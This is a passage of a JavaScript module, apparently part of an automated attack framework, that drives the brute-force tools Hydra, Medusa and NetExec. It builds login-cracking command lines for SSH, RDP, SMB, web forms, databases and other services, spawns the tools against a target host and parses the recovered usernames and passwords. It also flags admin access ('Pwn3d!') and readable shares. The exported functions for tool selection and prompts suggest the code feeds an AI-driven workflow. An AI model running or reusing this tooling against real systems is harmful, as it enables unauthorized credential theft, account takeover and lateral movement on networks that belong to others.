    case "postgresql":
      return `postgres://${host}:${port}`;
    case "mssql":
      return `mssql://${host}:${port}`;
    case "redis":
      return `redis://${host}:${port}`;
    case "mongodb":
      return `mongodb://${host}:${port}`;
    case "smtp":
      return `smtp://${host}:${port}`;
    case "pop3":
      return `pop3://${host}:${port}`;
    case "imap":
      return `imap://${host}:${port}`;
    case "snmp":
      return `snmp://${host}:${port}`;
    case "smb":
      return `smb://${host}:${port}`;
    case "ldap":
      return `ldap2://${host}:${port}`;
    case "http_basic":
      return `http-get://${host}:${port}`;
    case "http_form":
    case "http_json_api": {
      const loginUrl = config.target.loginUrl || "/login";
      const formParams = config.target.formParams || `username=^USER^&password=^PASS^`;
      const failStr = config.target.failureString || "Invalid";
      const path = new URL(loginUrl, `http://${host}`).pathname;
      return `${host} http-post-form "${path}:${formParams}:F=${failStr}"`;
    }
    default:
      return `${protocol}://${host}:${port}`;
  }
}
function buildMedusaCommand(config) {
  const args = [];
  args.push("-h", config.target.host);
  args.push("-n", String(config.target.port));
  if (config.usernameFile) {
    args.push("-U", config.usernameFile);
  } else if (config.usernames.length === 1) {
    args.push("-u", config.usernames[0]);
  } else {
    args.push("-U", "/tmp/medusa_users.txt");
  }
  if (config.passwordFile) {
    args.push("-P", config.passwordFile);
  } else if (config.passwords.length === 1) {
    args.push("-p", config.passwords[0]);
  } else {
    args.push("-P", "/tmp/medusa_passwords.txt");
  }
  const module = mapProtocolToMedusa(config.target.protocol);
  args.push("-M", module);
  args.push("-t", String(Math.min(config.threads, 32)));
  if (config.stopOnFirst) {
    args.push("-f");
  }
  args.push("-v", "4");
  if (config.extraFlags) {
    args.push(...config.extraFlags);
  }
  return args;
}
function mapProtocolToMedusa(protocol) {
  const mapping = {
    ssh: "ssh",
    ftp: "ftp",
    telnet: "telnet",
    rdp: "rdp",
    vnc: "vnc",
    mysql: "mysql",
    postgres: "postgres",
    postgresql: "postgres",
    mssql: "mssql",
    smtp: "smtp",
    pop3: "pop3",
    imap: "imap",
    snmp: "snmp",
    smb: "smbnt",
    http_basic: "http",
    http_form: "web-form",
    http_json_api: "web-form",
    svn: "svn",
    cvs: "cvs",
    rlogin: "rlogin",
    rexec: "rexec",
    rsh: "rsh",
    afp: "afp",
    ncp: "ncp",
    nntp: "nntp",
    pcanywhere: "pcanywhere",
    vmauthd: "vmauthd"
  };
  return mapping[protocol] || protocol;
}
function buildNetExecCommand(config) {
  const args = [];
  const module = config.netexecModule || mapProtocolToNetExec(config.target.protocol);
  args.push(module);
  args.push(config.target.host);
  if (config.usernameFile) {
    args.push("-u", config.usernameFile);
  } else if (config.usernames.length > 0) {
    args.push("-u", ...config.usernames);
  }
  if (config.target.ntlmHash) {
    args.push("-H", config.target.ntlmHash);
  } else if (config.passwordFile) {
    args.push("-p", config.passwordFile);
  } else if (config.passwords.length > 0) {
    args.push("-p", ...config.passwords);
  }
  if (config.target.domain) {
    args.push("-d", config.target.domain);
  }
  args.push("--port", String(config.target.port));
  args.push("--continue-on-success");
  if (config.netexecPostAuth) {
    for (const action of config.netexecPostAuth) {
      args.push(`--${action}`);
    }
  }
  if (config.extraFlags) {
    args.push(...config.extraFlags);
  }
  return args;
}
function mapProtocolToNetExec(protocol) {
  const mapping = {
    smb: "smb",
    winrm: "winrm",
    ldap: "ldap",
    mssql: "mssql",
    rdp: "rdp",
    ssh: "ssh",
    ftp: "ftp",
    wmi: "wmi"
  };
  return mapping[protocol] || "smb";
}
function parseHydraOutput(output) {
  const successes = [];
  const errors = [];
  let totalAttempts = 0;
  const lines = output.split("\n");
  for (const line of lines) {
    const successMatch = line.match(/\[(\d+)\]\[(\w[\w-]*)\]\s+host:\s+(\S+)\s+login:\s+(\S+)\s+password:\s+(.*)/);
    if (successMatch) {
      successes.push({
        username: successMatch[4],
        password: successMatch[5].trim(),
        timestamp: Date.now(),
        responseCode: parseInt(successMatch[1]),
        responseSnippet: `${successMatch[2]} service on ${successMatch[3]}`,
        additionalInfo: `Discovered by Hydra via ${successMatch[2]} protocol`
      });
    }
    const summaryMatch = line.match(/(\d+)\s+valid\s+password/i);
    if (summaryMatch) {
    }
    if (line.includes("[ATTEMPT]") || line.includes("[DATA]")) {
      totalAttempts++;
    }
    if (line.includes("[ERROR]") || line.includes("[WARNING]")) {
      errors.push(line.trim());
    }
  }
  if (totalAttempts === 0) {
    const attemptMatch = output.match(/(\d+)\s+(?:of\s+\d+\s+)?target/);
    if (attemptMatch) totalAttempts = parseInt(attemptMatch[1]);
  }
  return { successes, totalAttempts: Math.max(totalAttempts, successes.length), errors };
}
function parseMedusaOutput(output) {
  const successes = [];
  const errors = [];
  let totalAttempts = 0;
  const lines = output.split("\n");
  for (const line of lines) {
    const successMatch = line.match(/ACCOUNT FOUND:\s+\[(\w+)\]\s+Host:\s+(\S+)\s+User:\s+(\S+)\s+Password:\s+(\S+)/);
    if (successMatch) {
      successes.push({
        username: successMatch[3],
        password: successMatch[4],
        timestamp: Date.now(),
        responseSnippet: `${successMatch[1]} service on ${successMatch[2]}`,
        additionalInfo: `Discovered by Medusa via ${successMatch[1]} module`
      });
    }
    if (line.includes("ATTEMPT") || line.includes("Trying")) {
      totalAttempts++;
    }
    if (line.includes("ERROR") || line.includes("ALERT")) {
      errors.push(line.trim());
    }
  }
  return { successes, totalAttempts: Math.max(totalAttempts, successes.length), errors };
}
function parseNetExecOutput(output) {
  const successes = [];
  const errors = [];
  const metadata = { adminAccess: [], shares: [], domainInfo: null };
  let totalAttempts = 0;
  const lines = output.split("\n");
  for (const line of lines) {
    const successMatch = line.match(/(\w+)\s+(\S+)\s+(\d+)\s+(\S+)\s+\[\+\]\s+(?:(\S+)\\)?(\S+):(\S+)/);
    if (successMatch) {
      const isAdmin = line.includes("(Pwn3d!)");
      successes.push({
        username: successMatch[6],
        password: successMatch[7].replace(/\s*\(Pwn3d!\)/, ""),
        timestamp: Date.now(),
        responseSnippet: `${successMatch[1]} on ${successMatch[2]}:${successMatch[3]} (${successMatch[4]})`,
        accessLevel: isAdmin ? "admin" : "user",
        additionalInfo: `Discovered by NetExec. ${isAdmin ? "LOCAL ADMIN ACCESS CONFIRMED (Pwn3d!)" : "Standard user access"}${successMatch[5] ? `. Domain: ${successMatch[5]}` : ""}`
      });
      if (isAdmin) {
        metadata.adminAccess.push({ host: successMatch[2], user: successMatch[6] });
      }
    }
    if (line.includes("[-]")) {
      totalAttempts++;
    }
    if (line.includes("[+]")) {
      totalAttempts++;
    }
    const shareMatch = line.match(/(\S+)\s+(\S+)\s+(\d+)\s+(\S+)\s+(\S+)\s+(READ|WRITE|READ,WRITE)/);
    if (shareMatch) {
      metadata.shares.push({
        host: shareMatch[2],
        share: shareMatch[5],
        access: shareMatch[6]
      });
    }
    if (line.includes("[!]") || line.includes("ERROR")) {
      errors.push(line.trim());
    }
  }
  return { successes, totalAttempts: Math.max(totalAttempts, successes.length), errors, metadata };
}
async function executeExternalAttack(config) {
  const sessionId = `ext-${config.tool}-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
  const startedAt = Date.now();
  const detected = detectAllTools();
  const toolInfo = detected[config.tool];
  if (!toolInfo?.installed && config.tool !== "builtin") {
    return {
      tool: config.tool,
      sessionId,
      target: `${config.target.host}:${config.target.port}`,
      protocol: config.target.protocol,
      startedAt,
      completedAt: Date.now(),
      durationSec: 0,
      totalAttempts: 0,
      successfulLogins: [],
      failedAttempts: 0,
      errors: [`${config.tool} is not installed. Install with: ${getInstallCommand(config.tool)}`],
      status: "tool_not_found",
      rawOutput: "",
      metadata: { installCommand: getInstallCommand(config.tool) }
    };
  }
  const fs = await import("fs");
  if (config.usernames.length > 1 && !config.usernameFile) {
    const tempFile = `/tmp/${config.tool}_users_${sessionId}.txt`;
    fs.writeFileSync(tempFile, config.usernames.join("\n") + "\n");
    config.usernameFile = tempFile;
  }
  if (config.passwords.length > 1 && !config.passwordFile) {
    const tempFile = `/tmp/${config.tool}_passwords_${sessionId}.txt`;
    fs.writeFileSync(tempFile, config.passwords.join("\n") + "\n");
    config.passwordFile = tempFile;
  }
  let binary;
  let args;
  switch (config.tool) {
    case "hydra":
      binary = "hydra";
      args = buildHydraCommand(config);
      break;
    case "medusa":
      binary = "medusa";
      args = buildMedusaCommand(config);
      break;
    case "netexec":
      binary = detected.netexec.path?.includes("nxc") ? "nxc" : "netexec";
      args = buildNetExecCommand(config);
      break;
    default:
      return {
        tool: config.tool,
        sessionId,
        target: `${config.target.host}:${config.target.port}`,
        protocol: config.target.protocol,
        startedAt,
        completedAt: Date.now(),
        durationSec: 0,
        totalAttempts: 0,
        successfulLogins: [],
        failedAttempts: 0,
        errors: ["Use the built-in engine for this tool type"],
        status: "error",
        rawOutput: "",
        metadata: {}
      };
  }
  console.log(`[ExternalCredTools] Executing: ${binary} ${args.join(" ")}`);
  return new Promise((resolve) => {
    let stdout = "";
    let stderr = "";
    let timedOut = false;
    const proc = spawn(binary, args, {
      timeout: config.globalTimeout * 1e3,
      env: { ...process.env, TERM: "dumb" }
    });
    proc.stdout?.on("data", (data) => {
      stdout += data.toString();
    });
    proc.stderr?.on("data", (data) => {
      stderr += data.toString();
    });
    const timeoutHandle = setTimeout(() => {
      timedOut = true;
      proc.kill("SIGTERM");
      setTimeout(() => proc.kill("SIGKILL"), 5e3);
    }, config.globalTimeout * 1e3);
    proc.on("close", (code) => {
      clearTimeout(timeoutHandle);
      const completedAt = Date.now();
      const durationSec = Math.round((completedAt - startedAt) / 1e3);
      const fullOutput = stdout + "\n" + stderr;
      let parsed;
      switch (config.tool) {
        case "hydra":
          parsed = parseHydraOutput(fullOutput);
          break;
        case "medusa":
          parsed = parseMedusaOutput(fullOutput);
          break;
        case "netexec":
          parsed = parseNetExecOutput(fullOutput);
          break;
        default:
          parsed = { successes: [], totalAttempts: 0, errors: ["Unknown tool"] };
      }
      try {
        if (config.usernameFile?.startsWith("/tmp/")) fs.unlinkSync(config.usernameFile);
        if (config.passwordFile?.startsWith("/tmp/")) fs.unlinkSync(config.passwordFile);
      } catch {
      }
      resolve({
        tool: config.tool,
        sessionId,
        target: `${config.target.host}:${config.target.port}`,
        protocol: config.target.protocol,
        startedAt,
        completedAt,
        durationSec,
        totalAttempts: parsed.totalAttempts,
        successfulLogins: parsed.successes,
        failedAttempts: parsed.totalAttempts - parsed.successes.length,
        errors: parsed.errors,
        status: timedOut ? "stopped_timeout" : code === 0 || parsed.successes.length > 0 ? "completed" : "completed",
        rawOutput: fullOutput.substring(0, 1e4),
        metadata: parsed.metadata || { exitCode: code }
      });
    });
    proc.on("error", (err) => {
      clearTimeout(timeoutHandle);
      resolve({
        tool: config.tool,
        sessionId,
        target: `${config.target.host}:${config.target.port}`,
        protocol: config.target.protocol,
        startedAt,
        completedAt: Date.now(),
        durationSec: 0,
        totalAttempts: 0,
        successfulLogins: [],
        failedAttempts: 0,
        errors: [`Failed to execute ${binary}: ${err.message}`],
        status: "error",
        rawOutput: "",
        metadata: {}
      });
    });
  });
}
function getInstallCommand(tool) {
  switch (tool) {
    case "hydra":
      return "sudo apt-get install -y hydra";
    case "medusa":
      return "sudo apt-get install -y medusa";
    case "netexec":
      return "pip install netexec";
    default:
      return "N/A";
  }
}
function getToolKnowledgeBase() {
  return TOOL_KNOWLEDGE_BASE;
}
function getToolSelectionPrompt() {
  return TOOL_SELECTION_SYSTEM_PROMPT;
}
function quickToolRecommendation(protocol, isAD = false) {
  if (isAD) return "netexec";
  const netexecProtocols = ["smb", "winrm", "wmi"];
  if (netexecProtocols.includes(protocol)) return "netexec";
  const hydraFirst = [
    "ssh",
    "ftp",
    "telnet",
    "http_form",
    "http_basic",
    "http_digest",
    "http_json_api",
    "mysql",
    "postgresql",
    "postgres",
    "mssql",
    "redis",
    "mongodb",
    "vnc",
    "smtp",
    "pop3",
    "imap",
    "snmp",
    "ldap",
    "rdp"
  ];
  if (hydraFirst.includes(protocol)) return "hydra";
  return "hydra";
}
export {
  TOOL_KNOWLEDGE_BASE,
  TOOL_SELECTION_SYSTEM_PROMPT,
  clearToolDetectionCache,
  detectAllTools,
  executeExternalAttack,
  getToolCapabilities,
  getToolKnowledgeBase,
  getToolSelectionPrompt,
  quickToolRecommendation,
  recommendTool
};
